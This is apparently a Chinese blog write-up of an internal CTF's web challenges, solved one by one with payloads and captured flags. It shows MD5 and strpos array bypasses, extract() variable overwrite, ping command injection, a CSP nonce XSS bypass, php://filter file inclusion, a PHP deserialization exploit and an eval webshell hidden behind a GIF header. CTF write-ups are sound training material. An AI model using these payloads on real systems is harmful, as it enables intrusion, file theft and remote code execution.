---
title: 某CTF内部赛wp
date: 2022-06-16 19:36:39
tags: 
       - 赛后复盘
       - CTF
categories: 
       - [赛后复盘]
       - [CTF]
password: aygxy
wrong_pass_message: 不用试了，不想让你们看到的内容
theme: xray
---
某CTF内部赛wp

<!--more-->



# 签到

```
flag{welcome_to_ctf}
```

# 你熟悉html吗？

![image.png](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241648817.png?x-oss-process=hzy)

```
flag{7c305728-a69f-49c3-abb4-8020e6680347}
```

# 都是限制

> 作为安全从业者，bypass是基础技能。

右键和快捷键都被禁用，抓包

![image7f0cbd07adabd144.png](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241648896.png?x-oss-process=hzy)

```
flag{55880038-4c64-40db-9cd8-843127acd842}
```

# 传说中的爆破

> 随随便便爆破一下，脑洞大了，也可以盲猜。

直接爆破即可，字典到位就行，这题略

# 跳的太快了

> 蹦蹦跳跳真可爱～

![image549cf6db89525f83.png](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241648467.png?x-oss-process=hzy)

抓包放包得到flag

![image1d6cc13773118c54.png](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241648543.png?x-oss-process=hzy)

```
flag{0fbd79ed-f9c4-4f98-be6e-a7f296f7f227}
```

# 哈希的问题

> 不完美的哈希

```
<?php
error_reporting(0);
include('flag.php');
highlight_file(__FILE__);

if (isset($_GET['aaa']) and isset($_GET['bbb'])) {
if ($_GET['aaa'] == $_GET['bbb'])
print 'Your bbb can not be your aaa.';
else if (md5($_GET['aaa']) == md5($_GET['bbb']))
die('Flag: '.$flag);
else
print 'Invalid bbb';
}
?>
```

这个直接构造两个md5相同的值即可,除此之外也可以使用数组绕过，如下

payload

```
?aaa[]=1&bbb[]=2
```

![imagebb291ae878c6c138.png](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241648689.png?x-oss-process=hzy)



```
flag{6504ca3f-2993-4891-93a7-64576cff54e3}
```

# 神奇的操作

> 在同一个文件夹下，对一个文件执行crtl+c，然后再执行crtl+v，你猜会发生什么

- 变量覆盖

  ```
  source.php代码如下： 
  <?php
    include("fl4g.php");
    show_source(__FILE__);
  
  if ($_SERVER["REQUEST_METHOD"] == "POST") {
      extract($_POST);
      if ($pass == $thepassword) { 
          echo $flag;
       } 
   }
  ```

  extract()函数原型为`int extract(array &$var_array [,int $extract_type=EXTR_OVERWRITE [,string $prefix = NULL]])` ，从数组中将变量导入当前符号表，`$extract_type`缺省值为1，若没有另外指定，函数将覆盖已有变量，故传入任意pass和与之相等的thepassword即可。

```
pass=123&thepassword=123
```

![image1b4f600474601c20.png](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241648308.png?x-oss-process=hzy)

```
flag{b32fb8b6-cecb-4f12-b5e3-48f4dfcef6fe}
```

# 简单的命令执行

> 给你机会你不中用啊

```
<?php
header("content-type:text/html;charset=utf-8");
$res = FALSE;

if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    // $m = [];
    if (!preg_match_all("/\//", $ip, $m)) {
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title> Ping一下</title>
</head>
<body>

<h1> Ping一下</h1>

<form action="#" method="GET">
    <label for="ip">IP : </label><br>
    <input type="text" id="ip" name="ip">
    <input type="submit" value="Ping">
</form>

<hr>

<pre>
<?php
if ($res) {
    print_r($res);
}
?>
</pre>

<?php
highlight_file(__FILE__);
?>

</body>
</html>
```

```
127.0.0.1;ls  // 分号阻断，让其都执行
```

```
Array
(
    [0] => PING 127.0.0.1 (127.0.0.1): 56 data bytes
    [1] => 64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.040 ms
    [2] => 64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.081 ms
    [3] => 64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.084 ms
    [4] => 64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.103 ms
    [5] => 
    [6] => --- 127.0.0.1 ping statistics ---
    [7] => 4 packets transmitted, 4 packets received, 0% packet loss
    [8] => round-trip min/avg/max = 0.040/0.077/0.103 ms
    [9] => flag.php
    [10] => index.php
)
```

```
127.0.0.1;cat flag.php
```

```
Array
(
    [0] => PING 127.0.0.1 (127.0.0.1): 56 data bytes
    [1] => 64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.063 ms
    [2] => 64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.075 ms
    [3] => 64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.075 ms
    [4] => 64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.081 ms
    [5] => 
    [6] => --- 127.0.0.1 ping statistics ---
    [7] => 4 packets transmitted, 4 packets received, 0% packet loss
    [8] => round-trip min/avg/max = 0.063/0.073/0.081 ms
    [9] =>  $flag = 'flag{cb93c6d3-2e66-4c45-aba1-b227a67f0f31}';
    [11] => ?>
)
```

```
flag{cb93c6d3-2e66-4c45-aba1-b227a67f0f31}
```

# xss

> xss一下

进去之后界面是这样的，这道题我没写出来，说一下思路吧

![image841a458ea0e49246.png](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241648472.png?x-oss-process=hzy)

一个preview一个submit，提交了一个反射xss，没有回显

看一下preview.php

```
<html>
<meta http-equiv="Content-Security-Policy" content="script-src 'nonce-1167324031d4a56cef8cf4a6f8375ceb';">
<p>comment here</p>
<script nonce="1167324031d4a56cef8cf4a6f8375ceb">var test='test';</script>
<p>welcome to comment on admin's blog</p>
</html>
```

发现有csp，绕过很简单，就是带个属性nonce，只要带了这个值就可以绕过去，测试看看

```
<script nonce="e4f55f42402bc155701f5214c4e95a04">alert(1)</script>
```

![62d7d70516535b2daad1f23e828d758.png](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241649865.png?x-oss-process=hzy)

成功绕过，那么这个时候问题就来了，正常情况下这样只需要随便找个平台然后上传恶意代码就可以了，但是我测试了一下，代码剩生效但是插不到管理员，我又监听日志，也没有得到，无解

[![b28dfdf27f4fdc820b5aa9c92a2192a.png](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241649486.png?x-oss-process=hzy)](https://z4a.net/image/2nAxci)

# 组合拳

> 不是吧不是吧，这么简单放一起就不会了？

```

you are not admin ! 
<!--
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];

if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
    echo "hello admin!<br>";
    include($file); //class.php
}else{
    echo "you are not admin ! ";
}
 -->
```

分析一下，首先get进入三个变量，参数名分别为user、file、pass，判断了$user是否存在，然后判断$user的文件内容是否等于the user is admin

所以可以采用include，input伪协议，存在任意文件读取漏洞.也可以写进去

![image7c86b8b7d9395945.png](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241649593.png?x-oss-process=hzy)

然后再用filter伪协议进行封装

```
http://121.89.196.104:10029/?user=php://input&file=php://filter/read=convert.base64-encode/resource=class.php
```

得到base解密后是

```
 
<?php

class Read{//f1a9.php
    public $file;
    public function __toString(){
        if(isset($this->file)){
            echo file_get_contents($this->file);    
        }
        return "__toString was called!";
    }
}
?>
```

需要使用$file把class.php包含进来，然后把$pass反序列化之后，`echo $pass`这句话会执行对象里面的__toString函数

![image0575459ac6ff4202.png](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241649771.png?x-oss-process=hzy)

最后payload如下

```
http://121.89.196.104:10029/?user=php://input&file=class.php&pass=O:4:"Read":1:{s:4:"file";s:10:"./f1a9.php";}
```

这个时候我遇到了个问题那就是这样之后只是显示

```
hello admin!
__toString was called! 
```

看源码还是显示

```
you are not admin ! 
<!--
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];

if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
    echo "hello admin!<br>";
    include($file); //class.php
}else{
    echo "you are not admin ! ";
}
 -->
```

此时我想到了抓包，修改然后发包，最终得到flag

![imagebcbf45a9ce8c187a.png](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241649677.png?x-oss-process=hzy)

```
flag{0f01af6e-d8a1-4534-a1d3-8061c745d454}
```

# 手速要快

> 单身20年的手速跟你闹呢？

抓包改包放包，得到加密的密码，md5解密得到密码![image8543895ae774cd3b.png](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241649369.png?x-oss-process=hzy)

```
9dcffc0c26a18115e62074f175e19dc8    ---->1655377970    //这里不用解码，虽然能解出来
```

但是这个密码显示错误，我看了一下所有劫持的页面，发现了个`favicon.ico`![image-20220617102230657](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241649519.png?x-oss-process=hzy)

访问发现这才是真正的登录界面![image-20220617102553275](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241649659.png?x-oss-process=hzy)

输入密码，进去之后是文件上传，上传个图片马

```
GIF89a     // 加图片头
<?php @eval($_POST[attack]);?>
```

前端校验，后端过滤，双写绕过-->pphphp

cat过滤-----> tac绕过

![image-20220617102647200](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241649255.png?x-oss-process=hzy)



# 代码审计

> php是世界上最美的语言

```
<?php
header("content-type:text/html;charset=utf-8");
error_reporting(0);
include('./flag.php');
highlight_file(__FILE__);
if (isset ($_GET['ctf'])) {
if(strlen($_GET['ctf'])>4)
echo 'must be number!!!';
else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE)
die('Flag: '.$flag);
else
echo 'so low~';
}
?>
```

数组绕过

```
?ctf[]=1
```

```
flag{93935eda-4bf2-4dd3-bc4a-2321f914fef2}
```



# 基础的反序列化

> popopopop

最后才写这个，看代码看的有点ex

```
 <?php
show_source("index.php");
//error_reporting(0);

class test{
    public $username;
    public $password;

    function __construct($username, $password){
        $this->username = $username;
        $this->password = $password;
    }

    function __destruct(){
        $info = 'your secret is '.$this->password;
        echo $info;
    }
}

class exam{
    public $file;
    function __toString(){
        //flag.php
        echo file_get_contents($this->file);
        return 'nice';
    }
}


$text = $_GET['text'];
$res = unserialize($text);



?>
```

提示flag.php，审计一下，触发`__toString()`，必须找一个能把exam这个类当字符输出的地方，往上看可以找到`echo $info`，思路这就来了，看到`__destruct()`这个魔法函数，且`$password`可控

一鼓作气写exp

```
<?php
class test{
    public $username;
    public $password;

    function __construct($username, $password){
        $this->username = $username;
        $this->password = $password;
    }

    function __destruct(){
        $info = 'your secret is '.$this->password;
        echo $info;
    }
}

class exam{
    public $file;
    function __toString(){
        echo file_get_contents($this->file);
        return 'nice';
    }
}

$huang = new exam();
$huang->file = 'flag.php';
$YYDS = new test("shawroot",$huang);

echo serialize($YYDS);
?> 

//  O:4:"test":2:{s:8:"username";s:8:"shawroot";s:8:"password";O:4:"exam":1:{s:4:"file";s:8:"flag.php";}} 
```

然后就出了

```
flag{892da0a4-c0c0-47f5-8c79-63c8a8aec30a}
```

# 没那么简单

> 你中有我我中有你

- 文件包含       

![imagef37e3f099e037a26.png](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241650470.png?x-oss-process=hzy)

随便上传一个图片，啥回显也没有，但是注意看payload

![image63a9d90815ebecd2.png](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241650524.png?x-oss-process=hzy)

所以这不是文件上传题目，应该是文件包含吧，刚开始先试一下本地的文件包含

![image121b27cc4904f84c.png](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241650981.png?x-oss-process=hzy)

被ban掉了，虽然没成，但是确定是文件包含漏洞了。

继续考虑php绕过吧

```
http://121.89.196.104:10039/?op=php://filter/read=convert.base64-encode/resource=common
```

![imagef6e9e002bd82788f.png](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241650085.png?x-oss-process=hzy)

解码得到

```
<?php
if(!defined('FROM_INDEX')) die();

define('MAX_IM_SIZE', 100);

function create_image_key() {
    return sha1($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT'] . time() . mt_rand());
}

function load_image($imagekey) {
    if(1 !== preg_match('/[0-9a-f]{40}/', $imagekey)) {
        fatal('Invalid image key.');
    }

    $im = imagecreatefrompng("uploads/{$imagekey}.png");
    if(!$im) {
        fatal('Failed to load image.');
    }
    return $im;
}
stream_wrapper_unregister ("zip");
?>
```

这就是代表啥都上传不了，也猜到了，因为考点不是文件上传，但是这个时候又遇到了个难点，我不论咋注入，真的是都是只返回error，这让我从何下手，遇到困难用御剑，拿出我的祖传字典，爆去吧。。。。。。

最后还真爆出了个好东西，flag.php，直接有啊，无语。。。

直接本地包含就出了

```
http://121.89.196.104:10039/?op=php://filter/read=convert.base64-encode/resource=flag
```

![image3375b1b13c5997b6.png](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241650581.png?x-oss-process=hzy)

解密得到

```
<?php 
$flag="flag{446476a4-c918-4f57-b5e7-a28d78a277e9}"; 
?>
```

# 总结

![image07cacfd629ea4ff7.png](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206241650325.png?x-oss-process=hzy)

身为小菜鸡的我一下午也算是做出了一点成绩，xss我认为是题目问题所以没出，也算ak了吧，希望以后都能ak比赛题目吧，加油！
